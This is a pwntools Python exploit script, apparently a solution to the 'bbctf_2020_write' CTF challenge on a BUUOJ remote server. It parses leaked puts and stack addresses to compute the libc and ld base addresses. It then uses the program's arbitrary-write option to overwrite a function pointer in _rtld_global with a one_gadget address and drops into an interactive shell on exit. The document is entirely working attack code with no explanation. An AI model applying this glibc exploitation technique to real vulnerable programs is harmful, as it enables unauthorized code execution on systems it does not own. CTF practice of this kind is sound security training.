from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('bbctf_2020_write')
io = remote('node4.buuoj.cn', 25937)
libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
ld = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so')
# libc = ELF('libc-2.27.so')
elf = ELF('bbctf_2020_write')

io.recvuntil('puts: ')
puts = int(io.recvline()[:-1], 16)
log.success('puts addr: ' + hex(puts))

io.recvuntil('stack: ')
stack = int(io.recvline()[:-1], 16)
log.success('stack addr: ' + hex(stack))

libc_base = puts - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))
ld_base = libc_base + 0x3f1000
log.success('ld_base: ' + hex(ld_base))

_rtld_global = ld_base + ld.sym['_rtld_global']
one_gadget = libc_base + 0xe569f

io.sendlineafter('(q)uit\n', 'w')
io.sendlineafter('ptr: ', str(_rtld_global + 0xf00))
io.sendlineafter('val: ', str(one_gadget))

# gdb.attach(io)
io.sendlineafter('(q)uit\n', 'q')
# pause()
io.interactive()
